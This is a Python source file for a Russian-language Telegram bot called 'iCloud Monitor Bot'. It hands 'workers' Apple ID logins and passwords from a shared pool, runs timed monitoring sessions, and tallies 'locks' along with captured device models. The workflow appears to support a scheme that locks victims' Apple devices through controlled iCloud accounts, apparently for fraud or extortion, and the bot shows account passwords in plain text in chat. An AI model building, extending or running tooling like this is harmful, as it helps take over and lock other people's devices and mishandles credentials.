# bot/handlers/worker.py
import asyncio
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery
from aiogram.filters import Command
from aiogram.exceptions import TelegramBadRequest
from typing import Dict, Optional

from bot.keyboards import get_main_keyboard, get_account_menu_keyboard, get_extend_timer_keyboard
from utils.logger import logger

router = Router()
router.db = None
router.autolocker = None

# Хранилище сессий воркеров
worker_sessions: Dict[int, Dict[str, int]] = {}


def get_worker_session(worker_id: int) -> Optional[Dict[str, int]]:
    return worker_sessions.get(worker_id)


def set_worker_session(worker_id: int, account_id: int, session_id: int) -> None:
    worker_sessions[worker_id] = {"account_id": account_id, "session_id": session_id}


def del_worker_session(worker_id: int) -> None:
    worker_sessions.pop(worker_id, None)


async def safe_edit_message(callback: CallbackQuery, text: str, reply_markup=None):
    try:
        if callback.message:
            await callback.message.edit_text(text, reply_markup=reply_markup)
        else:
            await callback.answer(text)
    except TelegramBadRequest as e:
        if "message is not modified" in str(e):
            return
        logger.warning(f"Edit error: {e}")


# ============================================
# СТАРТ
# ============================================

@router.message(Command("start"))
async def cmd_start(message: Message):
    try:
        if not message.from_user:
            return
        telegram_id = message.from_user.id
        username = message.from_user.username or "unknown"

        worker = await router.db.get_worker_by_telegram_id(telegram_id)
        if not worker:
            worker = await router.db.create_worker(telegram_id, username)
            if not worker:
                await message.answer("❌ Ошибка регистрации.")
                return
            logger.info(f"New worker registered: @{username}")

        stats = await router.db.get_worker_stats(telegram_id)
        today_locks = stats.get("today_locks", 0)

        await message.answer(
            f"🤖 iCloud Monitor Bot\n\n"
            f"Привет, {message.from_user.first_name}! 👋\n"
            f"📊 Локов сегодня: {today_locks}",
            reply_markup=get_main_keyboard(worker.get("role", "worker"))
        )
    except Exception as e:
        logger.exception("cmd_start failed")
        await message.answer("❌ Ошибка. Попробуйте позже.")


# ============================================
# ПОЛУЧЕНИЕ АККАУНТА
# ============================================

@router.callback_query(F.data == "get_account")
async def get_account(callback: CallbackQuery):
    try:
        if not callback.from_user:
            await callback.answer("Ошибка")
            return
        worker_id = callback.from_user.id

        # Проверяем, нет ли уже активного аккаунта
        if get_worker_session(worker_id) is not None:
            await safe_edit_message(
                callback,
                "⚠️ У вас уже есть активный аккаунт!\nСначала верните его в пул.",
                reply_markup=get_account_menu_keyboard()
            )
            await callback.answer()
            return

        # Получаем аккаунт
        account = await router.db.get_and_lock_account()
        if not account:
            await safe_edit_message(callback, "❌ Нет свободных аккаунтов.")
            await callback.answer()
            return

        # Запускаем мониторинг
        session_id = await router.autolocker.start_monitoring(account["id"], worker_id)
        if not session_id:
            await router.db.update_account_status(account["id"], "available")
            await safe_edit_message(callback, "❌ Не удалось запустить мониторинг.")
            await callback.answer()
            return

        # СОХРАНЯЕМ СЕССИЮ (ЭТО ВАЖНО!)
        set_worker_session(worker_id, account["id"], session_id)
        logger.info(f"Session saved: worker={worker_id}, account={account['id']}, session_id={session_id}")

        await safe_edit_message(
            callback,
            f"✅ АККАУНТ ВЫДАН\n\n"
            f"Apple ID: {account.get('apple_id', 'Unknown')}\n"
            f"Пароль: {account.get('current_password', 'Unknown')}\n\n"
            f"⏱ Таймер: 30:00\n"
            f"Мониторинг активен",
            reply_markup=get_account_menu_keyboard()
        )
        await callback.answer()
    except Exception as e:
        logger.exception("get_account failed")
        await safe_edit_message(callback, "❌ Ошибка. Попробуйте позже.")
        await callback.answer()


# ============================================
# ВОЗВРАТ АККАУНТА
# ============================================

@router.callback_query(F.data == "return_account")
async def return_account(callback: CallbackQuery):
    try:
        if not callback.from_user:
            return
        worker_id = callback.from_user.id

        session = get_worker_session(worker_id)
        if not session:
            await safe_edit_message(callback, "❌ Нет активного аккаунта.")
            await callback.answer()
            return

        account_id = session["account_id"]
        await router.autolocker.stop_monitoring(account_id)
        await router.db.update_account_status(account_id, "available")
        del_worker_session(worker_id)

        await safe_edit_message(
            callback,
            "🔄 Аккаунт возвращён в пул.",
            reply_markup=get_main_keyboard("worker")
        )
        await callback.answer()
    except Exception as e:
        logger.exception("return_account failed")
        await safe_edit_message(callback, "❌ Ошибка.")
        await callback.answer()


# ============================================
# ПРОДЛЕНИЕ ТАЙМЕРА
# ============================================

@router.callback_query(F.data == "extend_timer")
async def extend_timer(callback: CallbackQuery):
    try:
        if not callback.from_user:
            await callback.answer()
            return
        
        worker_id = callback.from_user.id
        session = get_worker_session(worker_id)
        
        if not session:
            await safe_edit_message(callback, "❌ Нет активного аккаунта.")
            await callback.answer()
            return
        
        session_id = session.get("session_id")
        if not session_id:
            await safe_edit_message(callback, "❌ Нет активной сессии.")
            await callback.answer()
            return
        
        session_data = await router.db.get_session_by_id(session_id)
        if not session_data:
            await safe_edit_message(callback, "❌ Сессия не найдена.")
            await callback.answer()
            return
        
        current_minutes = session_data.get("duration_minutes", 30)
        
        await safe_edit_message(
            callback,
            f"⏱ ПРОДЛЕНИЕ ТАЙМЕРА\n\n"
            f"Текущее время: ~{current_minutes}:00\n"
            f"Максимум: 4 часа\n\n"
            f"Выберите время:",
            reply_markup=get_extend_timer_keyboard(session_id)
        )
        await callback.answer()
    except Exception as e:
        logger.exception("extend_timer failed")
        await safe_edit_message(callback, "❌ Ошибка.")
        await callback.answer()


@router.callback_query(F.data.startswith("extend_"))
async def process_extend(callback: CallbackQuery):
    try:
        data = callback.data
        parts = data.split("_")
        
        if len(parts) < 2:
            await callback.answer("❌ Неверный формат")
            return
        
        if parts[0] == "extend" and len(parts) == 3:
            session_id = int(parts[1])
            minutes = int(parts[2])
            
            success = await router.db.extend_session(session_id, minutes)
            if success:
                await safe_edit_message(
                    callback,
                    f"✅ Таймер продлён на +{minutes} минут!\n\n🔍 МОНИТОРИНГ АКТИВЕН",
                    reply_markup=get_account_menu_keyboard()
                )
            else:
                await safe_edit_message(callback, "❌ Ошибка продления. Попробуйте позже.")
            await callback.answer()
            return
        
        if parts[1] == "confirm":
            await safe_edit_message(
                callback,
                "✅ Таймер продлён!\n\n🔍 МОНИТОРИНГ АКТИВЕН",
                reply_markup=get_account_menu_keyboard()
            )
            await callback.answer()
            return
        
        if parts[1] == "cancel":
            await safe_edit_message(
                callback,
                "🔍 МОНИТОРИНГ АКТИВЕН\n\nСтатус: Ожидание входа",
                reply_markup=get_account_menu_keyboard()
            )
            await callback.answer()
            return
        
        await callback.answer("❌ Неверный формат")
    except Exception as e:
        logger.exception("process_extend failed")
        await safe_edit_message(callback, "❌ Ошибка.")
        await callback.answer()


# ============================================
# СТАТИСТИКА И ИСТОРИЯ
# ============================================

@router.callback_query(F.data == "my_stats")
async def my_stats(callback: CallbackQuery):
    try:
        if not callback.from_user:
            await callback.answer()
            return
        worker_id = callback.from_user.id
        worker = await router.db.get_worker_by_telegram_id(worker_id)
        stats = await router.db.get_worker_stats(worker_id)

        await safe_edit_message(
            callback,
            f"📈 МОЯ СТАТИСТИКА\n\n"
            f"Локи сегодня: {stats.get('today_locks', 0)}\n"
            f"Локи всего: {stats.get('total_locks', 0)}\n\n"
            f"Аккаунтов взято: {stats.get('total_taken', 0)}",
            reply_markup=get_main_keyboard(worker.get("role", "worker") if worker else "worker")
        )
        await callback.answer()
    except Exception as e:
        logger.exception("my_stats failed")
        await safe_edit_message(callback, "❌ Ошибка.")
        await callback.answer()


@router.callback_query(F.data == "my_history")
async def my_history(callback: CallbackQuery):
    try:
        if not callback.from_user:
            await callback.answer()
            return
        worker_id = callback.from_user.id
        history = await router.db.get_worker_history(worker_id)

        if not history:
            await safe_edit_message(
                callback,
                "📜 ИСТОРИЯ ЛОКОВ\n\nПока нет ни одного лога.",
                reply_markup=get_main_keyboard("worker")
            )
            await callback.answer()
            return

        text = "📜 ИСТОРИЯ ЛОКОВ\n\n"
        for item in history[:10]:
            captured_at = item.get("captured_at", "")
            date = captured_at[:10] if captured_at else "Unknown"
            text += f"• {date} — {item.get('device_model', 'Unknown')} ({item.get('log_id', '?')})\n"

        await safe_edit_message(callback, text, reply_markup=get_main_keyboard("worker"))
        await callback.answer()
    except Exception as e:
        logger.exception("my_history failed")
        await safe_edit_message(callback, "❌ Ошибка.")
        await callback.answer()
        
